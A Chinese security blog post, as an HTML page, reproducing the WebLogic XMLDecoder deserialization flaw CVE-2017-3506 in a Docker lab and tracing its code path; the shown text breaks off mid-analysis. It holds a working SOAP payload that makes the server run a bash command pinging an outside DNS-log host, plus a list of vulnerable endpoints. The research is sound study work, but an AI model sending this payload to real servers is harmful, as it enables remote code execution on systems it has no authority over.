<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"><title>初窥weblogic漏洞之XMLDecoder和T3反序列化漏洞 | 少年锦时</title><meta name="author" content="s8ark"><meta name="copyright" content="s8ark"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="首发于FreeBuf  https://www.freebuf.com/articles/web/363612.html   声明  感谢奇安信 CERT提出《WebLogic安全研究报告》一文和其中提出的搭建WebLogic环境的工具。本文为学习和复现此文章后进行的总结与反思，并做了相应的补充。注：文中引用部分均已标注  Oracle WebLogic Server 是一个统一的可扩展平台，专"><meta property="og:type" content="article"><meta property="og:title" content="初窥weblogic漏洞之XMLDecoder和T3反序列化漏洞"><meta property="og:url" content="https://blog.s8ark.top/2023/04/14/%E5%88%9D%E7%AA%A5weblogic%E6%BC%8F%E6%B4%9E%E4%B9%8BXMLDecoder%E5%92%8CT3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/index.html"><meta property="og:site_name" content="少年锦时"><meta property="og:description" content="首发于FreeBuf  https://www.freebuf.com/articles/web/363612.html   声明  感谢奇安信 CERT提出《WebLogic安全研究报告》一文和其中提出的搭建WebLogic环境的工具。本文为学习和复现此文章后进行的总结与反思，并做了相应的补充。注：文中引用部分均已标注  Oracle WebLogic Server 是一个统一的可扩展平台，专"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://image.3001.net/images/20230414/1681459367_643908a71137d54153e81.png!"><meta property="article:published_time" content="2023-04-14T14:15:26.000Z"><meta property="article:modified_time" content="2024-02-03T13:11:52.236Z"><meta property="article:author" content="s8ark"><meta property="article:tag" content="java安全"><meta property="article:tag" content="代码审计"><meta property="article:tag" content="反序列化"><meta property="article:tag" content="漏洞"><meta property="article:tag" content="weblogic"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://image.3001.net/images/20230414/1681459367_643908a71137d54153e81.png!"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://blog.s8ark.top/2023/04/14/%E5%88%9D%E7%AA%A5weblogic%E6%BC%8F%E6%B4%9E%E4%B9%8BXMLDecoder%E5%92%8CT3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="//hm.baidu.com"><link rel="preconnect" href="//busuanzi.ibruce.info"><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://unpkg.com/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media=&quot;all&quot;"><link rel="stylesheet" href="https://unpkg.com/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media=&quot;all&quot;"><script>var _hmt=_hmt||[];!function(){var e=document.createElement("script");e.src="https://hm.baidu.com/hm.js?aaf3e014fbcd61fc9b3e7614f72ed895";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)}()</script><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://unpkg.com/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://unpkg.com/flickr-justified-gallery/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE={title:"初窥weblogic漏洞之XMLDecoder和T3反序列化漏洞",isPost:!0,isHome:!1,isHighlightShrink:!1,isToc:!0,postUpdate:"2024-02-03 21:11:52"}</script><noscript><style type="text/css">#nav{opacity:1}.justified-gallery img{opacity:1}#post-meta time,#recent-posts time{display:inline!important}</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="/css/modify.css"><link rel="stylesheet" href="/css/font.css"><link rel="stylesheet" href="/css/top-header.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/touxiang.jpg" onerror="onerror=null,src=&quot;/img/friend_404.gif&quot;" alt="avatar"></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">21</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">40</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><hr><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/books/"><i class="fa-fw fas fa-book"></i><span> 书籍</span></a></div><div class="menus_item"><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image:url(https://image.3001.net/images/20230414/1681459367_643908a71137d54153e81.png!)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">少年锦时</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/books/"><i class="fa-fw fas fa-book"></i><span> 书籍</span></a></div><div class="menus_item"><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div></div><div id="nav-right"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i></a></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">初窥weblogic漏洞之XMLDecoder和T3反序列化漏洞</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-04-14T14:15:26.000Z" title="发表于 2023-04-14 22:15:26">2023-04-14</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-02-03T13:11:52.236Z" title="更新于 2024-02-03 21:11:52">2024-02-03</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" data-flag-title="初窥weblogic漏洞之XMLDecoder和T3反序列化漏洞"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><div class="top-img" style="background-image: url(https://image.3001.net/images/20230414/1681459367_643908a71137d54153e81.png!);"></div><article class="post-content" id="article-container"><blockquote><p>首发于FreeBuf <a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/363612.html">https://www.freebuf.com/articles/web/363612.html</a></p></blockquote><blockquote><p>声明</p></blockquote><p>感谢奇安信 CERT提出<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/qxkV_7MZVhUYYq5QGcwCtQ">《WebLogic安全研究报告》</a>一文和其中提出的搭建WebLogic环境的工具。本文为学习和复现此文章后进行的总结与反思，并做了相应的补充。<br>注：文中引用部分均已标注</p><blockquote><p>Oracle WebLogic Server 是一个统一的可扩展平台，专用于开发、部署和运行 Java 应用等适用于本地环境和云环境的企业应用。它提供了一种强健、成熟和可扩展的 Java Enterprise Edition (EE) 和 Jakarta EE 实施方式。</p></blockquote><h2 id="1-什么是web中间件"><a href="#1-什么是web中间件" class="headerlink" title="1.什么是web中间件"></a>1.什么是web中间件</h2><p>web中间件是服务器上web端口的<strong>翻译官</strong>。用户发送http请求到80端口。中间件负责解析请求，告诉服务器用户要请求哪些文件，并根据文件类型调用相应的脚本语言进行解析。<span class="colour" style="color:red">(接受处理http请求，返回html或json）</span></p><p>web中间件作用：路由、身份认证、日志、缓存</p><p>例子： Servlet、JSP、Spring MVC、weblogic</p><p>区分<strong>web中间件</strong>和<strong>web容器</strong>：</p><ul><li>Web容器可以提供Web应用程序的运行环境，支持Servlet和JSP技术，处理HTTP请求和响应。tomcat</li><li>Web中间件可以提供系统软件和应用软件之间的连接和交互，支持各种协议和技术，实现数据处理、服务治理、负载均衡等功能。weblogic</li><li>Web容器有时也可以作为Web中间件的一部分，比如tomcat既可以作为Web容器也可以作为Web中间件。</li></ul><h2 id="2-weblogic环境搭建"><a href="#2-weblogic环境搭建" class="headerlink" title="2.weblogic环境搭建"></a>2.weblogic环境搭建</h2><p>根据<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/qxkV/_7MZVhUYYq5QGcwCtQ%E4%B8%80%E6%96%87%E4%B8%AD%E6%8F%90%E5%87%BA%E7%9A%84%E5%B7%A5%E5%85%B7%EF%BC%8C%E6%88%90%E5%8A%9F%E6%90%AD%E5%BB%BA%E8%B5%B7%E6%9D%A5%E7%8E%AF%E5%A2%83">https://mp.weixin.qq.com/s/qxkV\_7MZVhUYYq5QGcwCtQ一文中提出的工具，成功搭建起来环境</a></p><p>记录一下踩到的坑：</p><ul><li>因为CentOS不维护最新版本了，所以需要在Dockerfile修改一下</li></ul><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">FROM centos</span><br><span class="line"></span><br><span class="line">RUN cd /etc/yum.repos.d/</span><br><span class="line">RUN sed -i 's/mirrorlist/#mirrorlist/g' /etc/yum.repos.d/CentOS-*</span><br><span class="line">RUN sed -i 's|#baseurl=http://mirror.centos.org|baseurl=http://vault.centos.org|g' /etc/yum.repos.d/CentOS-*</span><br></pre></td></tr></tbody></table></figure><ul><li>windows下的回车换行和linux不一样，还要改一下Dockerfile的这一部分</li></ul><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 安装JDK</span><br><span class="line">RUN sed -i 's/\r//' /scripts/jdk_install.sh</span><br><span class="line">RUN /scripts/jdk_install.sh</span><br><span class="line"># 安装weblogic</span><br><span class="line">RUN sed -i 's/\r//' /scripts/weblogic_install.sh</span><br><span class="line">RUN /scripts/weblogic_install.sh</span><br><span class="line"># 创建Weblogic Domain</span><br><span class="line">RUN sed -i 's/\r//' /scripts/create_domain.sh</span><br><span class="line">RUN /scripts/create_domain.sh</span><br><span class="line"># 打开Debug模式</span><br><span class="line">RUN sed -i 's/\r//' /scripts/open_debug_mode.sh</span><br><span class="line">RUN /scripts/open_debug_mode.sh</span><br></pre></td></tr></tbody></table></figure><ul><li>关于远程调试部分</li></ul><p>将文章中提到的两个文件复制到一个新的文件夹中</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker cp 容器的ip:/u01/app/oracle/middleware/modules .</span><br><span class="line">docker cp 容器的ip:/u01/app/oracle/middleware/wlserver/server/lib .</span><br></pre></td></tr></tbody></table></figure><p>使用IDEA打开这个文件夹，然后把这两个添加到库<br><img src="/images/%E5%88%9D%E7%AA%A5weblogic%E6%BC%8F%E6%B4%9E%E4%B9%8BXMLDecoder%E5%92%8CT3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.assets/1681442888_6438c848dfb75d320e594.png!small" alt="image.png"><br>然后点右上角的Add Configuration…<br><img src="/images/%E5%88%9D%E7%AA%A5weblogic%E6%BC%8F%E6%B4%9E%E4%B9%8BXMLDecoder%E5%92%8CT3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.assets/1681442971_6438c89b8538f1c684fb4.png!small" alt="image.png"><br>添加一个远程调试的配置</p><p><img src="/images/%E5%88%9D%E7%AA%A5weblogic%E6%BC%8F%E6%B4%9E%E4%B9%8BXMLDecoder%E5%92%8CT3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.assets/1681442999_6438c8b7a771cd9a91dca.png!small" alt="image.png"></p><p>出现如下字样即为成功</p><p><img src="/images/%E5%88%9D%E7%AA%A5weblogic%E6%BC%8F%E6%B4%9E%E4%B9%8BXMLDecoder%E5%92%8CT3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.assets/1681454814_6438f6de89752fe876e35.png!small" alt="image.png"></p><h2 id="3-XMLDecoder反序列化漏洞"><a href="#3-XMLDecoder反序列化漏洞" class="headerlink" title="3.XMLDecoder反序列化漏洞"></a>3.XMLDecoder反序列化漏洞</h2><blockquote><p>XMLDecder类似于fastjson,都是为了将jvm中的java对象持久化为文件</p></blockquote><p>XMLDecoder使用的是<strong>SAX解析规范</strong></p><p>图片来自：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/qxkV/_7MZVhUYYq5QGcwCtQ">https://mp.weixin.qq.com/s/qxkV\_7MZVhUYYq5QGcwCtQ</a></p><p><img src="/images/%E5%88%9D%E7%AA%A5weblogic%E6%BC%8F%E6%B4%9E%E4%B9%8BXMLDecoder%E5%92%8CT3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.assets/1681454836_6438f6f40cf10d824c112.png!small" alt="image.png"></p><h3 id="下面介绍一下SAX规范"><a href="#下面介绍一下SAX规范" class="headerlink" title="下面介绍一下SAX规范"></a><strong>下面介绍一下SAX规范</strong></h3><blockquote><p>SAX是简单XML访问接口，是一套XML解析规范，使用事件驱动的设计模式，那么事件驱动的设计模式自然就会有事件源和事件处理器以及相关的注册方法将事件源和事件处理器连接起来。</p></blockquote><p>图片来自：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/qxkV/_7MZVhUYYq5QGcwCtQ">https://mp.weixin.qq.com/s/qxkV\_7MZVhUYYq5QGcwCtQ</a></p><p><img src="/images/%E5%88%9D%E7%AA%A5weblogic%E6%BC%8F%E6%B4%9E%E4%B9%8BXMLDecoder%E5%92%8CT3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.assets/1681454854_6438f7069572d5b0c9af0.png!small" alt="image.png"><br>这里通过JAXP的工厂方法生成SAX对象，SAX对象使用<code>SAXParser.parer()</code>作为事件源，<code>ContentHandler</code>、<code>ErrorHandler</code>、<code>DTDHandler</code>、<code>EntityResolver</code>作为事件处理器，通过注册方法将二者连接起来。</p><h3 id="漏洞复现-CVE-2017-3506"><a href="#漏洞复现-CVE-2017-3506" class="headerlink" title="漏洞复现(CVE-2017-3506)"></a>漏洞复现(CVE-2017-3506)</h3><p>访问<a target="_blank" rel="noopener" href="http://localhost:7001/wls-wsat/CoordinatorPortType%E9%A1%B5%E9%9D%A2%EF%BC%8C%E4%BD%BF%E7%94%A8bp%E6%8A%93%E5%8C%85">http://localhost:7001/wls-wsat/CoordinatorPortType页面，使用bp抓包</a></p><p>更改请求类型为<strong>POST</strong>，Content-Type改为<strong>text/xml</strong><br><img src="/images/%E5%88%9D%E7%AA%A5weblogic%E6%BC%8F%E6%B4%9E%E4%B9%8BXMLDecoder%E5%92%8CT3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.assets/1681454911_6438f73f5ff51e0a33b58.png!small" alt="image.png"><br>在请求体内放入我们的POC</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"&gt;</span><br><span class="line">  &lt;soapenv:Header&gt;</span><br><span class="line">    &lt;work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"&gt;</span><br><span class="line">        &lt;java version="1.8.0_131" class="java.beans.XMLDecoder"&gt;</span><br><span class="line">          &lt;object class="java.lang.ProcessBuilder"&gt;</span><br><span class="line">            &lt;array class="java.lang.String" length="3"&gt;</span><br><span class="line">              &lt;void index="0"&gt;</span><br><span class="line">                &lt;string&gt;/bin/bash&lt;/string&gt;</span><br><span class="line">              &lt;/void&gt;</span><br><span class="line">              &lt;void index="1"&gt;</span><br><span class="line">                &lt;string&gt;-c&lt;/string&gt;</span><br><span class="line">              &lt;/void&gt;</span><br><span class="line">              &lt;void index="2"&gt;</span><br><span class="line">                &lt;string&gt;ping 999.merkwg.ceye.io&lt;/string&gt;</span><br><span class="line">              &lt;/void&gt;</span><br><span class="line">            &lt;/array&gt;</span><br><span class="line">          &lt;void method="start"/&gt;&lt;/object&gt;</span><br><span class="line">        &lt;/java&gt;</span><br><span class="line">      &lt;/work:WorkContext&gt;</span><br><span class="line">    &lt;/soapenv:Header&gt;</span><br><span class="line">  &lt;soapenv:Body/&gt;</span><br><span class="line">&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></tbody></table></figure><p>观察DNS平台，发现收到请求，攻击成功</p><blockquote><p>这里给出其他能触发XMLDecoder反序列化漏洞的路径</p></blockquote><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/wls-wsat/CoordinatorPortType</span><br><span class="line">/wls-wsat/RegistrationPortTypeRPC</span><br><span class="line">/wls-wsat/ParticipantPortType</span><br><span class="line">/wls-wsat/RegistrationRequesterPortType</span><br><span class="line">/wls-wsat/CoordinatorPortType11</span><br><span class="line">/wls-wsat/RegistrationPortTypeRPC11</span><br><span class="line">/wls-wsat/ParticipantPortType11</span><br><span class="line">/wls-wsat/RegistrationRequesterPortType11</span><br></pre></td></tr></tbody></table></figure><h3 id="XMLDecoder反序列化流程分析"><a href="#XMLDecoder反序列化流程分析" class="headerlink" title="XMLDecoder反序列化流程分析"></a>XMLDecoder反序列化流程分析</h3><p><img src="/images/%E5%88%9D%E7%AA%A5weblogic%E6%BC%8F%E6%B4%9E%E4%B9%8BXMLDecoder%E5%92%8CT3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.assets/1681455012_6438f7a4d66e6cd30fec7.png!small" alt="image.png"><br>进入<strong>XMLDecoder</strong>类的<strong>readObject</strong>方法后，先是调用了XMLDecoder类的<strong>parsingComplete</strong>方法<br><img src="/images/%E5%88%9D%E7%AA%A5weblogic%E6%BC%8F%E6%B4%9E%E4%B9%8BXMLDecoder%E5%92%8CT3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.assets/1681455088_6438f7f0747500311b50d.png!small" alt="image-20230313100828180.png"><br>跟进parsingComplete方法，发现其调用了<strong>DocumentHandler</strong>类的<strong>parse</strong>方法</p><p><img src="/images/%E5%88%9D%E7%AA%A5weblogic%E6%BC%8F%E6%B4%9E%E4%B9%8BXMLDecoder%E5%92%8CT3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.assets/1681455120_6438f810cc56a28ae7cda.png!small" alt="image-20230313101436278.png"></p><p>跟进此方法，看到他创建了一个<strong>SAXParser</strong>类的实例，调用了该实例的<strong>parse</strong>方法</p><p>进入<strong>SAXParserImpl</strong>类的<strong>parse</strong>方法</p><p><img src="/images/%E5%88%9D%E7%AA%A5weblogic%E6%BC%8F%E6%B4%9E%E4%B9%8BXMLDecoder%E5%92%8CT3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.assets/1681455148_6438f82cba16f5d7e2a11.png!small" alt="image-20230313102003876.png"></p><p>接着进入xmlReader的parse方法</p><p><img src="/images/%E5%88%9D%E7%AA%A5weblogic%E6%BC%8F%E6%B4%9E%E4%B9%8BXMLDecoder%E5%92%8CT3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.assets/1681455166_6438f83e9496ff47f71ec.png!small" alt="image-20230313102140647.png"></p><p>之后进入其父类<strong>AbstractSAXParser</strong>的<strong>parse</strong>方法。然后依次进入<strong>XMLParser</strong>类的<strong>parse</strong>方法，<strong>XML11Configuration</strong>类的<strong>parse</strong>方法</p><p><img src="/images/%E5%88%9D%E7%AA%A5weblogic%E6%BC%8F%E6%B4%9E%E4%B9%8BXMLDecoder%E5%92%8CT3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.assets/1681455182_6438f84ed95d43efcb6e8.png!small" alt="image-20230313105743005.png"></p><p>跟进<strong>XMLDocumentFragmentScannerImpl</strong>类的<strong>scanDocument</strong>方法,然后进入<strong>XMLDocumentScannerImpl</strong>的<strong>next</strong>方法，在进入<strong>XMLDocumentFragmentScannerImpl$FragmentContentDriver</strong>的<strong>next</strong>方法</p><p>再进入<strong>XMLDocumentFragmentScannerImpl</strong>类的<strong>scanStartElement</strong>方法</p><p>最后到了<strong>DocumentHandler</strong>的<strong>endElement</strong>方法</p><p><img src="/images/%E5%88%9D%E7%AA%A5weblogic%E6%BC%8F%E6%B4%9E%E4%B9%8BXMLDecoder%E5%92%8CT3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.assets/1681455204_6438f864ebfc3847afd93.png!small" alt="image-20230313112057905.png"></p><p>因为<strong>StringElementHandler</strong>是没有<strong>endElement</strong>方法到，所以直接进入其父类<strong>ElementHandler</strong>类的<strong>endElement</strong>方法</p><p><img src="/images/%E5%88%9D%E7%AA%A5weblogic%E6%BC%8F%E6%B4%9E%E4%B9%8BXMLDecoder%E5%92%8CT3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.assets/1681455224_6438f878d4d36d7eabff9.png!small" alt="image-20230313112254342.png"></p><p><img src="/images/%E5%88%9D%E7%AA%A5weblogic%E6%BC%8F%E6%B4%9E%E4%B9%8BXMLDecoder%E5%92%8CT3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.assets/1681455257_6438f8991fc5c5dcf08e1.png!small" alt="image-20230313112417211.png"></p><p>在其中又调用了getValueObject方法</p><p><img src="/images/%E5%88%9D%E7%AA%A5weblogic%E6%BC%8F%E6%B4%9E%E4%B9%8BXMLDecoder%E5%92%8CT3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.assets/1681455279_6438f8afe3da540bbb8ea.png!small" alt="image-20230313112620799.png"></p><p>直接将我们传递的值赋给value,之后返回到<strong>ElementHandler</strong>类的<strong>endElement</strong>方法</p><p><img src="/images/%E5%88%9D%E7%AA%A5weblogic%E6%BC%8F%E6%B4%9E%E4%B9%8BXMLDecoder%E5%92%8CT3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.assets/1681455302_6438f8c69d6c0f2e2c0f3.png!small" alt="image-20230313144608065.png"></p><p>然后添加参数,这样就将<code>&lt;string&gt;calc&lt;/string&gt;</code>这一行解析成功了</p><p>中间的先跳过，直接到解析<code>&lt;void class="java.lang.ProcessBuilder"&gt;</code>和<code>&lt;void method="start"/&gt;</code>进入ObjectElementHandler 类的getValueObject方法</p><p><img src="/images/%E5%88%9D%E7%AA%A5weblogic%E6%BC%8F%E6%B4%9E%E4%B9%8BXMLDecoder%E5%92%8CT3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.assets/1681456644_6438fe041ade580450e37.png!small" alt="image-20230313152506221.png"></p><p>新建了一个<strong>Expression</strong>对象，调用它的<strong>getValue</strong>方法</p><blockquote><p>Expression类是Java中的一个类，它代表一个可计算的表达式。这个类通常用于解析字符串并计算表达式的值。</p></blockquote><p><img src="/images/%E5%88%9D%E7%AA%A5weblogic%E6%BC%8F%E6%B4%9E%E4%B9%8BXMLDecoder%E5%92%8CT3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.assets/1681456662_6438fe1690d68f4d8deea.png!small" alt="image-20230313153923900.png"><br>进入<strong>Statement</strong>类的<strong>invoke</strong>方法</p><p><img src="/images/%E5%88%9D%E7%AA%A5weblogic%E6%BC%8F%E6%B4%9E%E4%B9%8BXMLDecoder%E5%92%8CT3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.assets/1681456673_6438fe21450957263f908.png!small" alt="image-20230313154322931.png"></p><p><img src="/images/%E5%88%9D%E7%AA%A5weblogic%E6%BC%8F%E6%B4%9E%E4%B9%8BXMLDecoder%E5%92%8CT3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.assets/1681456684_6438fe2ce64525d1c566a.png!small" alt="image-20230313155233678.png"><br>在这里通过反射的方式，调用了ProcessBuilder的start方法，完成解析</p><h3 id="漏洞流程分析"><a href="#漏洞流程分析" class="headerlink" title="漏洞流程分析"></a>漏洞流程分析</h3><p>lib\weblogic.jar!\weblogic\wsee\jaxws\workcontext\WorkContextServerTube.class在40行下断点</p><p>网页端访问 /wls-wsat/CoordinatorPortType</p><p><img 